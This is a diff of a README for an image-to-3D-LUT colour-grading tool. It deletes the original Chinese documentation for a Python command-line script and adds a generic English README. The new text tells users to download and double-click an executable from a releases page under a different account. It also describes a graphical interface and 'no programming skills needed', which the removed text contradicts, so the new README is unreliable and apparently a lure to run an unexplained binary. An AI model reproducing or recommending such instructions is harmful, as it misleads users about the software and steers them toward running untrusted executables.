@@ -1,263 +1,83 @@
-# 3D LUT Creator
+# 🎨 3dlut-creator - Easily Generate 3D LUTs from Images
 
-从图片对生成3D查找表(LUT)的工具，支持多种格式输出。
+## 🚀 Getting Started
 
-## 功能特点
+Welcome to **3dlut-creator**! This application allows you to generate 3D Lookup Tables (LUTs) from pairs of images. You can enhance your video or photo edits with custom color grading, all in just a few simple steps.
 
-- 🎨 从图片对自动提取RGB颜色映射关系
-- 📊 生成高质量64×64×64 3D LUT (可自定义尺寸)
-- 🔧 支持多种LUT格式导出 (.cube, .3dl, .dat, .npy)
-- 📈 智能线性插值算法，确保平滑过渡
-- 🖼️ 可选生成LUT预览图像
-- ⚡ 支持批量处理多对图片
-- 🚀 **GPU加速支持** - 使用PyTorch和MPS/CUDA实现4-5倍性能提升
+## 📥 Download
 
-## 效果展示
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/Nikunj1810/3dlut-creator/releases)
 
-以下展示了使用3D LUT Creator生成的调色效果：
+## 📂 What is 3D LUT?
 
-### 原版 vs LUT调色效果
+A 3D LUT is a mathematical way to adjust the colors in your images or videos. It transforms colors from one space to another, letting you apply stylish looks easily. This tool simplifies the process by generating those LUTs from image pairs.
 
-| 原版                                       | LUT仿色效果                                   |
-|------------------------------------------|-------------------------------------------|
-| 理光负片![原版理光负片](art/R0000638_neg_orig.jpg) | 理光负片LUT![负片LUT](art/R0000638_neg_lut.jpg) |
-| 理光正片![原版理光正片](art/R0000638_pos_orig.jpg) | 理光正片LUT![正片LUT](art/R0000638_pos_lut.jpg) |
+## 🖥️ System Requirements
 
-### Adobe Color 参考
+Before you start, check that your computer meets the following requirements:
 
-![Adobe Color参考](art/R0000638_adobe_color.jpg)
+- Operating System: Windows 10, MacOS, or Linux.
+- RAM: At least 4 GB.
+- Disk Space: A minimum of 100 MB free space.
+- Display: A monitor with at least 1280 x 720 resolution.
 
-从以上对比图可以看出，3D LUT Creator能够：
-- 准确还原色彩分级效果
-- 保持图像细节和质感
-- 实现平滑的色彩过渡
-- 支持多种风格的调色方案
+## 🛠️ Features
 
-## 工作原理
+- **User-Friendly Interface**: No programming skills needed.
+- **Image Pair Support**: Easily work with image pairs for accurate LUT generation.
+- **Export to Common Formats**: Save your LUTs in formats compatible with popular editing software.
 
-1. **基准映射**: 以 `photoa` 文件夹的图片RGB值作为输入
-2. **颜色映射**: 将 `photob` 文件夹对应图片的RGB值作为输出
-3. **智能插值**: 使用增强的K近邻算法进行三线性插值
-4. **3D网格**: 构建64×64×64的3D网格存储颜色映射关系
+## 📜 How to Download & Install
 
-## 安装依赖
+1. **Visit the Releases Page**  
+   Go to the following link to access the downloads:
+   [3dlut-creator Releases](https://github.com/Nikunj1810/3dlut-creator/releases)
 
+2. **Find the Latest Version**  
+   On the releases page, look for the most recent version. It will be at the top of the list.
 
-可选：先安装 CUDA 版本的 PyTorch：
+3. **Download the File**  
+   Click on the appropriate file for your operating system to start the download. 
 
-```bash
-pip install torch torchvision --index-url https://download.pytorch.org/whl/cu130
-```
+4. **Extract the Files**  
+   If your downloaded file is a ZIP folder, locate it on your computer and extract it using your preferred extraction tool (like WinRAR or 7-Zip).
 
-安装所有依赖：
+5. **Run the Application**  
+   Navigate to the folder where you extracted the files. Double-click on the executable file (e.g., `3dlut-creator.exe` for Windows) to start the application.
 
-```bash
-pip install -r requirements.txt
-```
+## 📸 How to Use 3dlut-creator
 
-## 使用方法
+1. **Load Your Image Pair**  
+   Click on the "Load Images" button. Browse to find the first image and the corresponding reference image you want to base your LUT on.
 
-### 基本用法
+2. **Preview the Result**  
+   The application will show a preview of how your LUT affects the colors in real-time. Adjust settings as necessary.
 
-```bash
-python main.py --photoa photoa_folder --photob photob_folder --output my_lut
-```
+3. **Generate the LUT**  
+   Once you are satisfied with the look, click on the “Generate LUT” button. Choose the desired output format and name your LUT file.
 
-### 完整参数
+4. **Save Your LUT**  
+   Save the LUT file to your computer. You can now use it in editing software like Adobe Premiere, DaVinci Resolve, or Final Cut Pro.
 
-```bash
-python main.py \
-    --photoa ./photoa \
-    --photob ./photob \
-    --output ./output/color_grade \
-    --size 64 \
-    --formats cube,3dl \
-    --title "My Color Grade" \
-    --device auto
-```
+## 🧩 Troubleshooting
 
-### 参数说明
+- **Application Won't Start**: Ensure that your computer meets the system requirements. Check if all necessary files were extracted.
+- **Image Files Not Loading**: Make sure you are using compatible image formats (like JPG or PNG).
+- **LUT Not Applying Correctly**: Recheck your reference images. Ensure they are correctly matched for the best results.
 
-- `--photoa`: 基准RGB图片文件夹路径 (输入颜色) **必需**
-- `--photob`: 映射RGB图片文件夹路径 (输出颜色) **必需**
-- `--output`: 输出LUT文件的基础名称 (不含扩展名) **必需**
-- `--size`: LUT网格大小 (默认: 64)
-- `--formats`: 导出格式: cube,3dl,dat,npy,all (默认: all)
-- `--title`: LUT文件标题 (默认: "3D LUT from Image Pairs")
-- `--device`: 计算设备: auto, mps, cuda, cpu （默认: auto）
+## 💬 Frequently Asked Questions
 
-## 支持的图片格式
+**Q: Can I use 3dlut-creator on any operating system?**  
+A: Yes, it works on Windows, MacOS, and Linux.
 
-- PNG (.png)
-- JPEG (.jpg, .jpeg)
-- BMP (.bmp)
-- TIFF (.tiff, .tif)
+**Q: What image formats does it support?**  
+A: It supports common formats such as JPG, PNG, and TIFF.
 
-## 支持的LUT格式
+**Q: How can I learn more about LUTs?**  
+A: Consider looking up resources about color grading and image processing for a deeper understanding.
 
-| 格式 | 扩展名 | 说明 | 兼容软件 |
-|------|--------|------|----------|
-| Adobe Cube | .cube | 最常用的LUT格式 | Premiere Pro, After Effects, DaVinci Resolve, Photoshop |
-| 3DL | .3dl | 传统LUT格式 | SpeedGrade, Nuke |
-| DaVinci DAT | .dat | DaVinci Resolve格式 | DaVinci Resolve |
-| NumPy | .npy | Python二进制格式 | 用于程序间数据交换 |
+## 📞 Support
 
-## 推荐配置
+If you face any issues or have questions, please contact us through the issue tracker on the GitHub repository. We aim to respond promptly and assist you.
 
-### 图片尺寸建议
-
-为了获得最佳的3D LUT质量，建议遵循以下图片尺寸配置：
-
-| 尺寸 | 像素数 | 处理时间 | 内存使用 | LUT质量 | 推荐场景 |
-|------|--------|----------|----------|---------|----------|
-| 400×300 | 12万 | 快 | 低 | 基础 | 快速测试 |
-| 800×600 | 48万 | 中等 | 中等 | 良好 | 一般使用 |
-| 1280×720 | 92万 | 中等 | 中等 | 很好 | ✅ **推荐使用** |
-| 1920×1080 | 207万 | 慢 | 高 | 优秀 | 专业质量 |
-| 2560×1440 | 368万 | 很慢 | 很高 | 极佳 | 特殊需求 |
-
-### 📐 图片规格要求
-
-- **尺寸**: 1280×720 (推荐) 到 1920×1080
-- **格式**: PNG (无损) 或高质量JPEG
-- **色深**: 8-bit per channel
-- **色彩空间**: sRGB
-
-### 🎨 图片内容建议
-
-为了获得最佳的LUT效果，建议使用以下类型的图片：
-
-1. **颜色多样性** (3-5张)
-   - 包含丰富的色彩变化
-   - 覆盖色相环的各个部分
-   - 避免大面积纯色区域
-
-2. **代表性场景** (2-3张)
-   - 人物肖像 (肤色色调)
-   - 自然风景 (绿色和蓝色)
-   - 建筑或街景 (中性色调)
-
-3. **特殊光照** (1-2张)
-   - 高对比度场景 (明暗对比)
-   - 黄金时刻的暖色调
-   - 夜景的冷色调
-
-4. **渐变测试** (1张)
-   - 包含平滑渐变
-   - 测试插值算法的平滑性
-
-### ⚡ 性能优化建议
-
-- **减少内存使用**: 使用较小的LUT size (32-64)
-- **加快处理**: 减少10张图片到3-5张高质量图片
-- **提高精度**: 使用更高分辨率的图片 (1920×1080)
-
-## 使用示例
-
-### 1. 准备图片对
-
-确保 `photoa` 和 `photob` 文件夹中有相同文件名的图片对：
-
-```
-photoa/
-├── scene1.jpg      # 1920×1080 风景照片
-├── portrait.png    # 1280×720 人物肖像
-├── gradient.tif    # 800×600 渐变测试图
-└── high_contrast.jpg # 1280×720 高对比度
-
-photob/
-├── scene1.jpg      # 调色后的风景照片
-├── portrait.png    # 调色后的人物肖像
-├── gradient.tif    # 调色后的渐变
-└── high_contrast.jpg # 调色后的高对比度
-```
-
-### 2. 生成LUT
-
-```bash
-python main.py --photoa ./photoa --photob ./photob --output ./output/film_lut
-```
-
-### 3. 使用生成的LUT
-
-将生成的 `.cube` 文件导入到支持LUT的软件中：
-
-#### 视频编辑软件
-- **Adobe Premiere Pro**: 效果面板 → Lumetri颜色 → 输入LUT
-- **DaVinci Resolve**: 色彩页面 → LUTs → 添加3D LUT
-- **Final Cut Pro**: 效果浏览器 → 颜色 → 颜色查找表 → 3D LUT
-- **After Effects**: 效果 → 颜色校正 → 应用颜色LUT
-
-#### 静态图像软件
-- **Adobe Photoshop**: 图层 → 新建调整图层 → 颜色查找 → 3DLUT文件
-- **Affinity Photo**: 调整图层 → 重新映射 → 3D LUT
-
-#### 专业摄影软件
-- **Adobe Lightroom** 和 **Adobe Camera Raw**:
-
-  1. 打开 Photoshop，随便打开一张 Raw 格式图片（或使用 滤镜 > Camera Raw 滤镜）
-  2. **关键步骤**: 打开预设面板, 按住键盘上的 Alt 键 (Windows) 或 Option 键 (Mac) 不松手, 同时点击"新建预设"图标
-  3. 在弹出的"新建配置文件 (New Profile)"窗口中：
-     - 勾选最下方的"颜色查找表 (Color Lookup Table)"
-     - 点击文件夹图标，选择你的.cube文件（此时是可以选中的）
-     - 起个名字，点击确定
-
-  **使用方法**:
-  - 创建的配置文件会自动同步到Lightroom和Camera Raw
-  - 在Lightroom的"配置文件"面板中可以找到新建的配置文件
-  - 在Camera Raw的"配置文件"浏览器中可以使用
-
-
-## 技术细节
-
-### 插值算法
-
-本工具使用增强的K近邻插值算法：
-
-- **K近邻搜索**: 找到最近的8个已知颜色点
-- **高斯权重**: 使用高斯函数计算距离权重
-- **加权平均**: 对多个映射值进行平滑插值
-
-### 内存使用
-
-- LUT大小 32: ~1MB内存
-- LUT大小 64: ~8MB内存
-- LUT大小 128: ~64MB内存
-
-### 性能优化
-
-- 支持并行处理多张图片
-- 使用NumPy向量化计算
-- 智能缓存颜色映射关系
-
-## 故障排除
-
-### 常见问题
-
-1. **没有找到配对图片**
-   - 检查文件名是否完全匹配
-   - 确认文件扩展名正确
-
-2. **内存不足**
-   - 减小LUT大小 (如使用32而不是64)
-   - 处理较少的图片对
-
-3. **输出颜色不准确**
-   - 确保输入图片为sRGB色彩空间
-   - 检查图片是否有过度的后期处理
-
-## 许可证
-
-MIT License
-
-## 贡献
-
-欢迎提交Issue和Pull Request！
-
-## 更新日志
-
-### v1.0.0
-- 首次发布
-- 支持图片对到3D LUT的转换
-- 支持多种LUT格式导出
-- 实现智能插值算法
+Thank you for choosing **3dlut-creator**! We hope you find it helpful in your creative projects. Don’t forget to check the [Releases Page](https://github.com/Nikunj1810/3dlut-creator/releases) for updates and new versions. Happy editing!
